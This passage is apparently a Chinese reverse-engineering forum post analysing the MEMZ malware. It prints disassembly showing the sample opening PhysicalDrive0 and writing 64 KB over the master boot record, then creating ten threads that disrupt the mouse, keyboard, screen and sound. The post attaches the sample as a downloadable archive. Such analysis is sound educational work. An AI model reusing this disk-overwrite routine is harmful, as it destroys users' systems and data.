
```
001D1306  |.^\7F DF         \JG SHORT MEMZ.001D12E7                                 ;  创建文件，覆盖原有的主引导区

001D1308  |>  53            PUSH EBX                                                ; /hTemplateFile

001D1309  |.  6A 03         PUSH 0x3                                                ; |Mode = OPEN_EXISTING

001D130C  |.  53            PUSH EBX                                                ; |pSecurity

001D130D  |.  6A 03         PUSH 0x3                                                ; |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE

001D130F  |.  68 000000C0   PUSH 0xC0000000                                         ; |Access = GENERIC_READ|GENERIC_WRITE

001D1314  |.  68 64391D00   PUSH MEMZ.001D3964                                      ; |FileName = "\\\\.\\PhysicalDrive0"

001D1319  |.  FF15 7C201D00 CALL DWORD PTR DS:[<&KERNEL32.CreateFileA>]             ; \CreateFileA

001D131F  |.  8BD8          MOV EBX, EAX                                            ;  文件句柄7C

001D1321  |.  895D F8       MOV DWORD PTR SS:[EBP-0x8], EBX

001D1324  |.  83FB FF       CMP EBX, -0x1

001D1327  |.  75 08         JNZ SHORT MEMZ.001D1331

001D1329  |.  6A 02         PUSH 0x2                                                ; /ExitCode = 0x2

001D132B  |>  FF15 68201D00 CALL DWORD PTR DS:[<&KERNEL32.ExitProcess>]             ; \ExitProcess

001D1331  |>  68 00000100   PUSH 0x10000                                            ; /Size = 10000 (65536.)

001D1336  |.  6A 40         PUSH 0x40                                               ; |Flags = LPTR

001D1338  |.  FF15 78201D00 CALL DWORD PTR DS:[<&KERNEL32.LocalAlloc>]              ; \LocalAlloc

001D133E  |.  33FF          XOR EDI, EDI

001D1340  |.  8BF0          MOV ESI, EAX

001D1342  |.  393D E8291D00 CMP DWORD PTR DS:[0x1D29E8], EDI

001D1348  |.  76 18         JBE SHORT MEMZ.001D1362

001D134A  |.  BA 18211D00   MOV EDX, MEMZ.001D2118

001D134F  |.  8BCE          MOV ECX, ESI

001D1351  |.  2BD6          SUB EDX, ESI

001D1353  |>  8A040A        /MOV AL, BYTE PTR DS:[EDX+ECX]                          ;  循环了12F次

001D1356  |.  47            |INC EDI

001D1357  |.  8801          |MOV BYTE PTR DS:[ECX], AL

001D1359  |.  41            |INC ECX

001D135A  |.  3B3D E8291D00 |CMP EDI, DWORD PTR DS:[0x1D29E8]

001D1360  |.^ 72 F1         \JB SHORT MEMZ.001D1353

001D1362  |>  33C9          XOR ECX, ECX

001D1364  |.  390D EC291D00 CMP DWORD PTR DS:[0x1D29EC], ECX

001D136A  |.  76 16         JBE SHORT MEMZ.001D1382

001D136C  |>  8A81 48221D00 /MOV AL, BYTE PTR DS:[ECX+0x1D2248]                     ;  循环7A0次

001D1372  |.  88840E FE0100>|MOV BYTE PTR DS:[ESI+ECX+0x1FE], AL

001D1379  |.  41            |INC ECX

001D137A  |.  3B0D EC291D00 |CMP ECX, DWORD PTR DS:[0x1D29EC]

001D1380  |.^ 72 EA         \JB SHORT MEMZ.001D136C                                 ;  写入数据向主分区

001D1382  |>  6A 00         PUSH 0x0                                                ; /pOverlapped = NULL

001D1384  |.  8D45 F4       LEA EAX, DWORD PTR SS:[EBP-0xC]                         ; |

001D1387  |.  50            PUSH EAX                                                ; |pBytesWritten

001D1388  |.  68 00000100   PUSH 0x10000                                            ; |nBytesToWrite = 10000 (65536.)

001D138D  |.  56            PUSH ESI                                                ; |Buffer

001D138E  |.  53            PUSH EBX                                                ; |hFile

001D138F  |.  8B1D 24201D00 MOV EBX, DWORD PTR DS:[<&KERNEL32.WriteFile>]           ; |kernel32.WriteFile

001D1395  |.  FFD3          CALL EBX                                                ; \WriteFile
```

写入的数据：

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_F293Y92AV6C8J44.png)

### 2、创建多个线程：

```
001D1423         |> /FF76 04       /PUSH DWORD PTR DS:[ESI+0x4]                            ;  休眠30s

001D1426         |. |FFD3          |CALL EBX

001D1428         |. |33C0          |XOR EAX, EAX

001D142A         |. |50            |PUSH EAX                                               ; /pThreadId => NULL

001D142B         |. |50            |PUSH EAX                                               ; |CreationFlags => 0

001D142C         |. |56            |PUSH ESI                                               ; |pThreadParm

001D142D         |. |68 2B1A1D00   |PUSH MEMZ.001D1A2B                                     ; |ThreadFunction = MEMZ.001D1A2B

001D1432         |. |50            |PUSH EAX                                               ; |StackSize => 0x0

001D1433         |. |50            |PUSH EAX                                               ; |pSecurity => NULL

001D1434         |. |FF15 64201D00 |CALL DWORD PTR DS:[<&KERNEL32.CreateThread>]           ; \CreateThread

001D143A         |. |47            |INC EDI

001D143B         |. |83C6 08       |ADD ESI, 0x8

001D143E         |. |3B3D DC391D00 |CMP EDI, DWORD PTR DS:[0x1D39DC]

001D1444         |.^\72 DD         \JB SHORT MEMZ.001D1423                                 ;  循环，创建10个恶意线程
```

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_VFACN38BMGERST3.png)

样本会创建多个进程，并且这些线程会进入死循环，直到系统崩溃。这些线程具体实现了以下的功能：

#### 1、设置随机鼠标的位置：

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_S4KFMK2P3PGW7Z2.png)

#### 2、模拟键盘：

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_YYJTNKK9VPC2RQT.png)

#### 3、播放声音：

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_ACXDPTM3P78SJ2F.png)

#### 4、屏幕闪烁：

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_NXWHJM5B2M73TJQ.png)

#### 5、显示图标：

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_AXCJXS3Z2TV9V9R.png)

#### 6、随机链接：

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_JT4QCGRVF9RNYH4.png)

#### 7、遍历子窗口：

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_S4FBG2N9AH8UUQM.png)

#### 8、修改分辨率：

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_KK8WPFRRSAZ5A4Z.png)

#### 9、改变颜色：

![图片描述](https://bbs.kanxue.com/upload/attach/202007/889500_JVWGDG4E3HKF5HJ.png)

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2020-7-23 22:52 被tutuj编辑，原因： 附加文件

[#调试逆向](https://bbs.kanxue.com/forum-4-1-1.htm)

上传的附件：

- [virus.rar](javascript:void(0);)

  （76.32kb，115次下载）
